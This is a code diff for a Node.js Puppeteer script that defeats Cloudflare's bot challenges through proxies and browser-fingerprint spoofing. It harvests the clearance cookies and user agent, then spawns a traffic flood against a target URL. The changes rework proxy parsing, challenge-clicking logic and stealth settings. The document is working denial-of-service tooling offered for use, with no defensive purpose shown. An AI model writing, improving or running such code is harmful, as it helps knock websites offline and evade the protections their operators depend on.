@@ -15,10 +15,18 @@ const duration = parseInt(process.argv[6]);
 
 console.log(`[ START ] Cloudflare Bypass Started - Target: ${targetURL}`);
 
-// Read proxies
+// Read proxies - format: ip:port
 const readProxies = (filePath) => {
     try {
-        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
+        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
+        return proxies.map(proxy => {
+            // Pastikan format ip:port
+            if (proxy.includes('://')) {
+                // Remove http:// or https:// jika ada
+                return proxy.replace(/https?:\/\//, '');
+            }
+            return proxy;
+        });
     } catch (error) {
         return [];
     }
@@ -30,38 +38,7 @@ const generateUserAgent = () => {
     return userAgent.toString();
 };
 
-// Human-like mouse movements
-class HumanMouse {
-    static async moveTo(page, selector) {
-        const element = await page.$(selector);
-        if (!element) return false;
-
-        const rect = await page.evaluate(el => {
-            const { top, left, width, height } = el.getBoundingClientRect();
-            return { top, left, width, height };
-        }, element);
-
-        // Human-like movement with curve
-        const steps = 10 + Math.floor(Math.random() * 10);
-        const startX = Math.random() * 100;
-        const startY = Math.random() * 100;
-        
-        for (let i = 0; i <= steps; i++) {
-            const t = i / steps;
-            // Bezier curve for human-like movement
-            const x = startX + (rect.left + rect.width/2 - startX) * t + Math.sin(t * Math.PI) * (Math.random() * 20 - 10);
-            const y = startY + (rect.top + rect.height/2 - startY) * t + Math.cos(t * Math.PI) * (Math.random() * 20 - 10);
-            
-            await page.mouse.move(x, y);
-            await sleep(Math.random() * 50 + 20);
-        }
-        
-        await page.mouse.move(rect.left + rect.width/2, rect.top + rect.height/2);
-        return true;
-    }
-}
-
-// Advanced wait function with random delays
+// Simple wait function
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const randomSleep = (min, max) => sleep(Math.random() * (max - min) + min);
 
@@ -99,58 +76,51 @@ const findCloudflareCookies = (cookies) => {
     return cfCookies;
 };
 
-// Enhanced Cloudflare bypass with multiple strategies
+// Enhanced Cloudflare bypass
 const advancedCloudflareBypass = async (page) => {
     try {
-        console.log(`[ BYPASS ] Starting Cloudflare challenge bypass...`);
-
-        // Wait for challenge page to load
+        console.log(`[ BYPASS ] Starting Cloudflare challenge...`);
+        
+        // Tunggu halaman challenge load
         await page.waitForFunction(() => document.readyState === 'complete');
-        await randomSleep(2000, 4000);
+        await randomSleep(3000, 6000);
 
-        // Check multiple challenge types
+        // Cek multiple selector untuk tombol challenge
         const challengeSelectors = [
-            // Cloudflare Challenge
-            'input[type="checkbox"][name="cf_captcha_kind"]',
+            'input[type="checkbox"]',
             '.hcaptcha-box',
             '[role="checkbox"]',
-            '.challenge-form input[type="checkbox"]',
+            '.cf-checkbox',
             '#challenge-stage input',
-            'label[for="cf-challenge-checkbox"]',
-            
-            // Cloudflare "Verify you are human" button
+            'input[name="cf_captcha_kind"]',
             '.verify-you-are-human',
-            '[id*="challenge"] button',
-            '[class*="challenge"] button',
-            '[type="submit"]',
-            'button[type="submit"]',
-            
-            // Alternative selectors
-            'input[value="Submit"]',
             '.button',
             '.btn',
+            'button',
+            'input[type="submit"]',
+            '[onclick*="submit"]',
             '.success',
             '.primary'
         ];
 
-        let challengeSolved = false;
+        let solved = false;
 
         for (const selector of challengeSelectors) {
             try {
                 const element = await page.$(selector);
                 if (element) {
-                    console.log(`[ BYPASS ] Found challenge element: ${selector}`);
+                    console.log(`[ BYPASS ] Found element: ${selector}`);
                     
-                    // Human-like mouse movement to element
-                    await HumanMouse.moveTo(page, selector);
+                    // Scroll ke element
+                    await page.evaluate(el => el.scrollIntoView(), element);
                     await randomSleep(500, 1500);
                     
-                    // Click with human-like delay
-                    await element.click({ delay: Math.random() * 100 + 50 });
-                    console.log(`[ BYPASS ] Clicked challenge element: ${selector}`);
+                    // Click element
+                    await element.click({ delay: 100 });
+                    console.log(`[ BYPASS ] Clicked: ${selector}`);
                     
-                    challengeSolved = true;
-                    await randomSleep(3000, 6000);
+                    solved = true;
+                    await randomSleep(5000, 8000);
                     break;
                 }
             } catch (e) {
@@ -158,200 +128,121 @@ const advancedCloudflareBypass = async (page) => {
             }
         }
 
-        // If no specific element found, try to find and click any clickable element in challenge area
-        if (!challengeSolved) {
-            console.log(`[ BYPASS ] No specific challenge element found, trying general approach...`);
-            
-            const clickableSelectors = [
-                'input',
-                'button',
-                'a',
-                '[onclick]',
-                '.button',
-                '.btn'
+        // Jika belum ketemu, coba click berdasarkan text
+        if (!solved) {
+            console.log(`[ BYPASS ] Trying text-based click...`);
+            const clickableTexts = [
+                'Verify you are human',
+                'Submit',
+                'Continue',
+                'Verify',
+                'I am human',
+                'Checkbox'
             ];
 
-            for (const selector of clickableSelectors) {
+            for (const text of clickableTexts) {
                 try {
-                    const elements = await page.$$(selector);
-                    for (const element of elements) {
-                        const isVisible = await page.evaluate(el => {
-                            const rect = el.getBoundingClientRect();
-                            return rect.width > 0 && rect.height > 0 && 
-                                   getComputedStyle(el).visibility !== 'hidden' && 
-                                   getComputedStyle(el).display !== 'none';
-                        }, element);
-
-                        if (isVisible) {
-                            await HumanMouse.moveTo(page, selector);
-                            await randomSleep(500, 1500);
-                            await element.click({ delay: Math.random() * 100 + 50 });
-                            console.log(`[ BYPASS ] Clicked general element: ${selector}`);
-                            challengeSolved = true;
-                            await randomSleep(3000, 6000);
-                            break;
-                        }
+                    const [button] = await page.$x(`//button[contains(., '${text}')]`);
+                    if (button) {
+                        await button.click({ delay: 100 });
+                        console.log(`[ BYPASS ] Clicked text: ${text}`);
+                        solved = true;
+                        await randomSleep(5000, 8000);
+                        break;
                     }
-                    if (challengeSolved) break;
                 } catch (e) {
                     continue;
                 }
             }
         }
 
-        // Wait for challenge to complete
-        console.log(`[ BYPASS ] Waiting for challenge completion...`);
-        await randomSleep(8000, 15000);
+        // Tunggu hasil
+        await randomSleep(8000, 12000);
 
-        // Check if challenge is solved
+        // Check if solved
         const title = await page.title();
-        const currentUrl = await page.url();
+        const url = await page.url();
         
-        console.log(`[ BYPASS ] Current Title: ${title}`);
-        console.log(`[ BYPASS ] Current URL: ${currentUrl}`);
-
-        // Check for success indicators
         const isSuccess = !title.includes('Just a moment') && 
                          !title.includes('Checking your browser') &&
                          !title.includes('Please wait') &&
-                         !currentUrl.includes('challenge');
+                         !url.includes('challenge');
 
         if (isSuccess) {
-            console.log(`[ BYPASS ] Challenge successfully solved!`);
+            console.log(`[ BYPASS ] Challenge solved!`);
             return { success: true };
         }
 
-        console.log(`[ BYPASS ] Challenge may not be solved, continuing anyway...`);
-        return { success: true }; // Continue even if not 100% sure
+        return { success: false };
 
     } catch (error) {
-        console.log(`[ BYPASS ] Error during bypass: ${error.message}`);
+        console.log(`[ BYPASS ] Error: ${error.message}`);
         return { success: false };
     }
-};
-
-// Enhanced browser setup with better stealth
-const setupStealthBrowser = async (proxy = null) => {
-    const userAgent = generateUserAgent();
-    
-    const args = [
-        '--no-sandbox',
-        '--disable-setuid-sandbox',
-        '--disable-dev-shm-usage',
-        '--disable-gpu',
-        '--no-first-run',
-        '--no-zygote',
-        '--disable-features=VizDisplayCompositor',
-        '--disable-background-timer-throttling',
-        '--disable-backgrounding-occluded-windows',
-        '--disable-renderer-backgrounding',
-        '--disable-web-security',
-        '--disable-features=site-per-process',
-        '--disable-ipc-flooding-protection',
-        '--ignore-certificate-errors',
-        '--ignore-ssl-errors',
-        '--window-size=1920,1080',
-        `--user-agent=${userAgent}`,
-        '--disable-blink-features=AutomationControlled'
-    ];
-
-    // Add proxy if available
-    if (proxy) {
-        args.push(`--proxy-server=${proxy}`);
-    }
-
-    const browser = await puppeteer.launch({
-        headless: true,
-        args: args,
-        ignoreHTTPSErrors: true,
-        defaultViewport: {
-            width: 1920,
-            height: 1080,
-            deviceScaleFactor: 1,
-            hasTouch: false,
-            isLandscape: true,
-            isMobile: false
-        }
-    });
-
-    const page = await browser.newPage();
-    
-    // Enhanced stealth evasions
-    await page.evaluateOnNewDocument(() => {
-        // Override webdriver property
-        Object.defineProperty(navigator, 'webdriver', {
-            get: () => false,
-        });
-        
-        // Override languages property
-        Object.defineProperty(navigator, 'languages', {
-            get: () => ['en-US', 'en'],
-        });
-        
-        // Override plugins property
-        Object.defineProperty(navigator, 'plugins', {
-            get: () => [1, 2, 3, 4, 5],
-        });
-        
-        // Mock Chrome runtime
-        window.chrome = {
-            runtime: {},
-        };
-        
-        // Remove automation痕迹
-        const originalQuery = window.navigator.permissions.query;
-        window.navigator.permissions.query = (parameters) => (
-            parameters.name === 'notifications' ?
-                Promise.resolve({ state: Notification.permission }) :
-                originalQuery(parameters)
-        );
-    });
-
-    // Set extra headers
-    await page.setExtraHTTPHeaders({
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'accept-encoding': 'gzip, deflate, br',
-        'cache-control': 'no-cache',
-        'pragma': 'no-cache',
-        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'none',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1'
-    });
-
-    await page.setViewport({ 
-        width: 1920, 
-        height: 1080,
-        deviceScaleFactor: 1
-    });
-
-    return { browser, page, userAgent };
 };
 
 // Process each browser
 const processBrowser = async (proxy, index, total) => {
     let browser;
     try {
-        console.log(`[ THREAD ${index} ] Starting with proxy: ${proxy || 'No Proxy'}`);
+        const userAgent = generateUserAgent();
         
-        const { browser: br, page, userAgent } = await setupStealthBrowser(proxy);
-        browser = br;
+        const args = [
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--disable-gpu',
+            '--no-first-run',
+            '--ignore-certificate-errors',
+            '--ignore-ssl-errors',
+            '--disable-web-security',
+            '--disable-features=site-per-process',
+            '--disable-blink-features=AutomationControlled',
+            '--window-size=1920,1080',
+            `--user-agent=${userAgent}`
+        ];
 
-        // Navigate to target with human-like behavior
+        // Add proxy if available (format: ip:port)
+        if (proxy && proxy.trim()) {
+            args.push(`--proxy-server=http://${proxy}`);
+            console.log(`[ THREAD ${index} ] Using proxy: ${proxy}`);
+        }
+
+        browser = await puppeteer.launch({
+            headless: true,
+            args: args,
+            ignoreHTTPSErrors: true
+        });
+
+        const page = await browser.newPage();
+        await page.setViewport({ width: 1920, height: 1080 });
+
+        // Enhanced stealth
+        await page.evaluateOnNewDocument(() => {
+            Object.defineProperty(navigator, 'webdriver', { get: () => false });
+            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
+            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
+        });
+
+        // Set extra headers
+        await page.setExtraHTTPHeaders({
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'accept-encoding': 'gzip, deflate, br',
+            'cache-control': 'no-cache',
+            'pragma': 'no-cache'
+        });
+
         console.log(`[ THREAD ${index} ] Navigating to target...`);
+        
+        // Navigate to target
         await page.goto(targetURL, { 
             waitUntil: 'networkidle0',
-            timeout: 60000,
-            referer: 'https://www.google.com/'
+            timeout: 60000 
         });
 
         // Solve Cloudflare
-        console.log(`[ THREAD ${index} ] Attempting Cloudflare bypass...`);
+        console.log(`[ THREAD ${index} ] Solving Cloudflare...`);
         const bypassResult = await advancedCloudflareBypass(page);
         
         if (!bypassResult.success) {
@@ -360,9 +251,8 @@ const processBrowser = async (proxy, index, total) => {
             return { success: false };
         }
 
-        // Get success data
+        // Get cookies
         const title = await page.title();
-        const currentUrl = await page.url();
         const cookies = await page.cookies();
         const cfCookies = findCloudflareCookies(cookies);
         
@@ -373,12 +263,11 @@ const processBrowser = async (proxy, index, total) => {
         }
 
         const cookieString = cfCookies.map(cookie => cookie.toString()).join('; ');
-        
-        // LOG OUTPUT PERSIS SEPERTI YANG DIMINTA
+        await browser.close();
+
+        // LOG OUTPUT
         console.log(`[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : ${proxy} | useragent : ${userAgent} | cookies : ${cookieString} |`);
         console.log(`[ SPAWN ] Flood with cookies : ${cookieString} : useragent : ${userAgent}`);
-
-        await browser.close();
 
         // Start flood
         spawn('node', [
@@ -414,18 +303,19 @@ const main = async () => {
     }
 
     console.log(`[ INFO ] Loaded ${proxies.length} proxies`);
-    console.log(`[ INFO ] Starting ${threads} threads`);
-    console.log(`[ INFO ] Attack duration: ${duration} seconds`);
+    console.log(`[ INFO ] Starting threads...`);
 
     for (let i = 0; i < Math.min(proxies.length, threads); i++) {
-        setTimeout(async () => {
-            await processBrowser(proxies[i], i + 1, proxies.length);
-        }, i * 10000); // Stagger starts by 10 seconds
+        await processBrowser(proxies[i], i + 1, proxies.length);
+        
+        // Delay antara thread
+        if (i < Math.min(proxies.length, threads) - 1) {
+            await sleep(10000);
+        }
     }
 
-    // Keep main process alive
-    await sleep(duration * 1000 + 60000);
-    console.log(`[ COMPLETE ] Attack finished`);
+    console.log(`[ COMPLETE ] All threads finished`);
+    await sleep(duration * 1000);
 };
 
 main().catch(console.error);
